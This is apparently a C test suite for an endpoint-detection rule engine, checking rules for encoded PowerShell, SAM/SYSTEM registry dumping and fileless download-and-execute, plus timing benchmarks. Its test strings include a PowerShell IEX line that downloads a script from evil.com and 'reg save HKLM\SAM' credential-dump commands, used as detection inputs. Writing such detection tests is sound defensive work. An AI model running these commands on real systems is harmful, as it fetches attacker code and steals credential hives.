#ifdef _WIN32
#include <windows.h>
#else
#include <sys/time.h>
#include <time.h>
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define ITERATIONS 100000
#define WARMUP_ITERATIONS 1000

typedef struct {
    const char *rule_id;
    const char *process_name;
    const char *cmdline;
    const char *parent_name;
    int chain_depth;
    int expected_match;
} TestCase;

static const TestCase g_test_cases[] = {
    {"R-EXEC-001", "powershell.exe", "-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A", NULL, 0, 1},
    {"R-EXEC-001", "powershell.exe", "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A", NULL, 0, 1},
    {"R-EXEC-001", "powershell.exe", "-e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A", NULL, 0, 1},
    {"R-EXEC-001", "powershell.exe", "-EncodedCommand", NULL, 0, 1},
    {"R-EXEC-001", "pwsh.exe", "-EncodedCommand SQBFAFgAIAA=", NULL, 0, 1},
    {"R-EXEC-001", "cmd.exe", "-EncodedCommand SQBFAFgAIAA=", NULL, 0, 0},
    {"R-EXEC-001", "notepad.exe", "-EncodedCommand SQBFAFgAIAA=", NULL, 0, 0},
    {"R-CRED-001", "reg.exe", "reg save HKLM\\SAM C:\\temp\\sam.save /y", NULL, 0, 1},
    {"R-CRED-001", "reg.exe", "save HKLM\\SYSTEM C:\\temp\\sys.save", NULL, 0, 1},
    {"R-CRED-001", "reg.exe", "export HKLM\\SECURITY C:\\temp\\sec.reg", NULL, 0, 0},
    {"R-CRED-001", "cmd.exe", "reg save HKLM\\SAM C:\\temp\\sam.save", NULL, 0, 0},
    {"R-FILELESS-001", "powershell.exe", "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')", NULL, 0, 1},
    {"R-FILELESS-001", "powershell.exe", "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')", NULL, 0, 1},
    {"R-FILELESS-001", "powershell.exe", "iex powershell -enc SQBFAFgAIAA=", NULL, 0, 1},
    {"R-FILELESS-001", "powershell.exe", "[Reflection.Assembly]::Load", NULL, 0, 1},
    {"R-FILELESS-001", "cmd.exe", "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')", NULL, 0, 0},
    {"R-FILELESS-001", "notepad.exe", "Invoke-Expression cmd", NULL, 0, 0},
};

static int g_pass_count = 0;
static int g_fail_count = 0;

extern int edr_p0_rule_matches3(const char *rule_id, const char *process_name, const char *cmdline, const char *parent_name, int chain_depth);

#ifdef _WIN32
static int64_t get_time_ns(void) {
    LARGE_INTEGER counter, frequency;
    QueryPerformanceCounter(&counter);
    QueryPerformanceFrequency(&frequency);
    return (int64_t)(counter.QuadPart * 1000000000LL / frequency.QuadPart);
}
#else
static int64_t get_time_ns(void) {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (int64_t)tv.tv_sec * 1000000000LL + (int64_t)tv.tv_usec * 1000LL;
}
#endif

static double get_time_ms(void) {
    return (double)get_time_ns() / 1000000.0;
}

static void run_functional_tests(void) {
    printf("=== Functional Tests ===\n");
    size_t num_cases = sizeof(g_test_cases) / sizeof(g_test_cases[0]);
    for (size_t i = 0; i < num_cases; i++) {
        const TestCase *tc = &g_test_cases[i];
        int result = edr_p0_rule_matches3(tc->rule_id, tc->process_name, tc->cmdline, tc->parent_name, tc->chain_depth);
        if (result == tc->expected_match) {
            printf("[PASS] Case %zu: %s | %s | %s => %d (expected %d)\n",
                   i, tc->rule_id, tc->process_name,
                   tc->cmdline ? tc->cmdline : "(null)", result, tc->expected_match);
            g_pass_count++;
        } else {
            printf("[FAIL] Case %zu: %s | %s | %s => %d (expected %d)\n",
                   i, tc->rule_id, tc->process_name,
                   tc->cmdline ? tc->cmdline : "(null)", result, tc->expected_match);
            g_fail_count++;
        }
    }
}

static void run_performance_tests(void) {
    printf("\n=== Performance Tests ===\n");

    int64_t start_ns, end_ns;
    double total_ms = 0.0;
    double min_ms = 1e9;
    double max_ms = 0.0;

    for (int i = 0; i < WARMUP_ITERATIONS; i++) {
        edr_p0_rule_matches3("R-EXEC-001", "powershell.exe",
                             "-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A",
                             NULL, 0);
    }

    for (int i = 0; i < ITERATIONS; i++) {
        start_ns = get_time_ns();
        edr_p0_rule_matches3("R-EXEC-001", "powershell.exe",
                             "-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A",
                             NULL, 0);
        end_ns = get_time_ns();
        double elapsed_ms = (double)(end_ns - start_ns) / 1000000.0;
        total_ms += elapsed_ms;
        if (elapsed_ms < min_ms) min_ms = elapsed_ms;
        if (elapsed_ms > max_ms) max_ms = elapsed_ms;
    }

    double avg_ms = total_ms / (double)ITERATIONS;
    printf("Iterations: %d\n", ITERATIONS);
    printf("Average: %.3f ms (%.3f us)\n", avg_ms, avg_ms * 1000.0);
    printf("Min: %.3f ms, Max: %.3f ms\n", min_ms, max_ms);
    printf("Throughput: %.0f ops/sec\n", 1000.0 / avg_ms);
}

static void run_stress_tests(void) {
    printf("\n=== Stress Tests ===\n");

    int64_t start_ns = get_time_ns();
    for (int i = 0; i < ITERATIONS; i++) {
        edr_p0_rule_matches3("R-EXEC-001", "powershell.exe",
                             "-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A",
                             NULL, 0);
        edr_p0_rule_matches3("R-CRED-001", "reg.exe",
                             "reg save HKLM\\SAM C:\\temp\\sam.save /y",
                             NULL, 0);
        edr_p0_rule_matches3("R-FILELESS-001", "powershell.exe",
                             "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')",
                             NULL, 0);
    }
    int64_t end_ns = get_time_ns();
    double total_s = (double)(end_ns - start_ns) / 1000000000.0;
    long total_ops = (long)ITERATIONS * 3;
    printf("Total ops: %ld in %.2f seconds\n", total_ops, total_s);
    printf("Throughput: %.0f ops/sec\n", (double)total_ops / total_s);
    printf("Latency: %.3f ms/op\n", (total_s * 1000.0) / (double)total_ops);
}

int main(int argc, char *argv[]) {
    printf("P0 Rule Engine Test Suite\n");
    printf("=========================\n");
    printf("Build: %s %s\n", __DATE__, __TIME__);
#ifdef _WIN32
    printf("Platform: Windows\n");
#else
    printf("Platform: Linux\n");
#endif
    printf("\n");

#ifdef _WIN32
    SetEnvironmentVariableA("EDR_P0_DIRECT_EMIT", "1");
#else
    setenv("EDR_P0_DIRECT_EMIT", "1", 1);
#endif

    run_functional_tests();
    run_performance_tests();
    run_stress_tests();

    printf("\n=== Summary ===\n");
    printf("PASS: %d, FAIL: %d\n", g_pass_count, g_fail_count);
    printf("Total test cases: %zu\n", sizeof(g_test_cases) / sizeof(g_test_cases[0]));

    return g_fail_count > 0 ? 1 : 0;
}